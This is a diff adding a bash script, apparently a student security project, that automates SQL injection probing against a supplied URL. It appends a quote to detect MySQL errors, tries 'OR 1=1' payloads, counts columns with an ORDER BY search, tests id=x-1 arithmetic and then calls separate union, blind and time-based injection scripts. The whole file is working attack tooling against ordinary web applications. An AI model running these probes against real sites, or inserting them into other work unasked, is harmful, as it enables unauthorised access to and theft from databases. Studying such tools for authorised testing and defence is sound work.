@@ -1,0 +1,97 @@
+#!/bin/bash 
+url=$1
+
+RED='\033[0;31m' 
+NC='\033[0m'
+Blue='\033[0;34m'
+
+########check_connection############################
+echo "URL is $url"
+g=`curl -siL "$url" 2> /dev/null`
+if [ $? == 6 ] 
+then
+	echo "Error:Could not resolve host" 
+	exit
+	#pkill -9 login.sh
+######### SQL injection 1###############
+else
+	echo -e "${Blue}[info] Connection Established. ${NC}"
+	y=`echo $url\'`
+	echo "[info] Trying \` with the given URL"
+	first_error=`curl -s $y | grep "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use"`
+	if [[ $first_error ]]
+	then
+		echo -e "${RED}[***]  Database Accepted \"'\". ${NC}" 
+		echo -e "${RED}[***]  Database Type: MYSQL. ${NC}"
+	fi
+	############# Accepting OR 1=1 ############################
+	z=`echo $url+OR+1+=+1`
+	echo -e "[info] Trying String \"OR 1=1 \" "
+	xx=`curl -s $z | wc -c`
+	x=$(($xx-50))
+	y=`curl -s $url | wc -c`
+	if (( $x > $y )) 
+	then 
+		echo -e "${RED}[***]  String \"OR 1=1 \" works ${NC}"
+	else
+		echo -e "${RED}[***]  String \"OR 1=1 \" didn't work ${NC}"
+	fi
+	############# counting number of columns ######################
+	inc=8
+	for ((s=1;s<100;s+=$inc))
+	do
+		echo "[info] Trying order by ${s}"
+		xx=`curl -s $url+order+by+$s | grep "Unknown column"`
+		if [[ $xx ]]
+		then 
+			if [[ $inc == 1 &&  $xx ]]
+			then
+				column=$((s-1))
+				echo -e "${Blue}[***]  Number of columns is $column ${NC}"
+				export column
+				break
+			elif [[ $inc == 1 && -z $xx ]]
+			then
+				column=$s
+				echo -e "${Blue}[***]  Number of columns is $column ${NC}"
+				export column
+				break
+			fi
+			s=$(($s-$inc))
+			inc=$(($inc/2))
+		fi
+	done 
+
+	################# id = x-1 ###############################
+
+	x=` echo $url | grep =[[:digit:]]*\$`
+	if [[ $x ]]
+	then 
+		y=`echo $url | cut -d= -f2`
+		x=$(($y+1))
+		z=`echo $url |sed -e "s/=[[:digit:]]*$/=$x-1/" `
+		e=`curl -s $z`
+		ee=`curl -s $url`
+		if [ "$e" == "$ee" ]
+		then 
+			echo -e "${RED}[***]  Both of \"id=1 and id=2-1\" showed the same page ${NC}"
+		fi 
+	fi
+fi
+
+if [[ $column ]]  # Trying union based attack if columns number is found 
+then
+	echo "[info] Testing Union-based Injection." 
+	sleep 1
+	. ./union.sh 
+	echo "[info] Testing Blind-based Injection."
+	sleep 1
+	. ./BlindSQLFinal.sh
+	echo "[info] Database seems to be invulnerable!!"
+	echo "[info] Testing Timed-based Injection." 
+	. ./timed.sh
+fi
+
+###############################################################
+#### by Menna Hany
+### ITI_SA_37
